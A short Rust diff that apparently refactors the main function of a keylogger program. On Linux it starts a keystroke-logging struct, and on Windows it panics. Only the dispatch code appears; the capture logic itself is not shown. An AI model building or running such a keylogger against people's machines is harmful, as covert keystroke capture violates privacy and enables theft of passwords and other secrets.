@@ -8,13 +8,9 @@ use linux::keylogger::Keylogger as LinuxKeyLog;
 
 fn main() {
     let os = consts::FAMILY;
+    let kl: Box<dyn Common>;
 
-    if os.contains("windows") {
-        // let kl = Windows { };
-        // kl.find_keyboard();
-    } else {
-        let kl = LinuxKeyLog { };
+    kl = if os.contains("windows") { panic!("sznioooo") } else { Box::new( LinuxKeyLog { } ) };
 
-        kl.start_logging();
-    }
+    kl.start_logging();
 }
